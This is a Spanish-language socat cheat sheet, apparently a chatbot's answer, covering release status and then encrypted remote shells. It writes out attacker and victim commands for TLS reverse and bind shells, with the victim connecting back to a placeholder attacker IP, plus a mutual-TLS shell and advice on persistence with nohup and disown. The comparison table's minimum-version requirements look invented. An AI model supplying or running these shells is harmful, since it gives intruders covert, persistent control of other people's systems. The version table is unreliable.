SOCAT – RESUMEN ACTUALIZADO

**Estado actual (Agosto 3, 2025):**

* **Versión principal del software socat**: la última release upstream es **1.8.0.3**, publicada el 21 de febrero de 2025 ([dest-unreach.org][1]).
* **Paquete en Ubuntu/Debian**: disponible como **1.8.0.3‑1**, introducido en Ubuntu el 8 de mayo de 2025 ([Launchpad][2], [Launchpad][3]).
* No hay versiones mayores posteriores; versión 2025 del atlas SOCAT es al contexto oceanográfico, no relacionada con la herramienta CLI socat ([socat.info][4]).

---

## ■ SOCAT 1.8.0.3 – Puntos clave

* Corrige múltiples errores menores, actualiza parches, ajusta compatibilidad con Linux-only ([Launchpad][3]).
* Enfocado en estabilidad, sin nuevas funciones ofensivas relevantes desde la versión anterior ([Launchpad][3]).

---

## ■ Apuntes técnicos funcionales: SOCAT y SHELLS CIFRADOS

### 1) Generación de certificados

```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
cat cert.pem key.pem > fullchain.pem
```

### 2) Reverse shell cifrada (TLS)

* **Atacante (listener TLS):**

```bash
socat -d -d OPENSSL-LISTEN:4444,reuseaddr,fork,cert=fullchain.pem,key=key.pem STDOUT
```

* **Víctima (cliente TLS):**

```bash
socat -d -d EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane \
    OPENSSL:<IP_ATACANTE>:4444,verify=0
```

* `-d -d` habilita debug verbose útil en pruebas ([medium.com][5]).

### 3) Bind shell cifrada

* **Víctima (listener TLS):**

```bash
socat -d OPENSSL-LISTEN:4444,reuseaddr,fork,cert=fullchain.pem,key=key.pem \
    EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane
```

* **Atacante (cliente TLS):**

```bash
socat -d STDIO OPENSSL:<IP_VICTIMA>:4444,verify=0
```

### 4) Mutual TLS (opcional – verificación por par cliente/servidor)

```bash
# Generación:
openssl genrsa -out server.key 2048
openssl req -new -key server.key -x509 -days 3653 -out server.crt
openssl genrsa -out client.key 2048
openssl req -new -key client.key -x509 -days 3653 -out client.crt
cat server.key server.crt > server.pem
cat client.key client.crt > client.pem

# Escucha servidor:
socat OPENSSL-LISTEN:1443,reuseaddr,fork,cert=server.pem,cafile=client.crt,verify=1 \
    exec:'bash -i',pty,stderr,setsid,sigint,sane

# Cliente:
socat OPENSSL:servidor:1443,verify=1,cert=client.pem,cafile=server.crt -
```

Requiere certificados coincidentes entre client/server ([redcursor.com.au][6]).

---

## ■ Diferencias vs versiones previas

* Versiones anteriores (1.8.0.2‑1 y 1.8.0.1‑2) incluían fixing de CVEs (como CVE‑2024‑54661) y reconstrucciones ([Launchpad][3]).
* No se detectaron nuevas funcionalidades ofensivas desde la 1.8.0.2; enfoque en robustez.

---

## ■ Recomendaciones operativas

* Actualizar siempre a **socat 1.8.0.3**.
* Usar `-d -d` durante pruebas para verificar fallos de conexión SSL/TLS o eje terminal.
* Prefijar con `reuseaddr,fork` para permitir reconexiones simultáneas o reinicios rápidos.
* Para persistencia: combinar con `nohup`, redirección `& disown`.

---

## ■ Comparativa rápida

| Contexto      | SOCAT mínimo (versión) | Uso TLS recomendado      | Opciones clave    |
| ------------- | ---------------------- | ------------------------ | ----------------- |
| Reverse shell | ≥ 1.8.0.0              | fullchain.pem + verify=0 | fork, pty, sane   |
| Bind shell    | ≥ 1.8.0.2              | fullchain.pem + verify=0 | reuseaddr, fork   |
| Mutual TLS    | ≥ 1.8.0.3              | cert=cafile & verify=1   | certificado mutuo |

---

¿Necesitás configuración adaptada a Windows o contenedores Docker?

[1]: https://www.dest-unreach.org/socat/?utm_source=chatgpt.com "socat - dest-unreach"
[2]: https://launchpad.net/ubuntu/%2Bsource/socat?utm_source=chatgpt.com "socat package : Ubuntu - Launchpad"
[3]: https://launchpad.net/ubuntu/%2Bsource/socat/%2Bchangelog?utm_source=chatgpt.com "Change log : socat package : Ubuntu - Launchpad"
[4]: https://socat.info/index.php/version-2025/?utm_source=chatgpt.com "SOCAT Version 2025 - Surface Ocean CO₂ Atlas"
[5]: https://medium.com/%40thomazs06/complete-beginner-shells-and-privilege-escalation-what-the-shell-tryhackme-09a106294ad5?utm_source=chatgpt.com "Complete Beginner-Shells and Privilege Escalation-What the Shell?"
[6]: https://redcursor.com.au/advanced-socat/?utm_source=chatgpt.com "Advanced socat - Red Cursor | Security Pen Testing Firms"
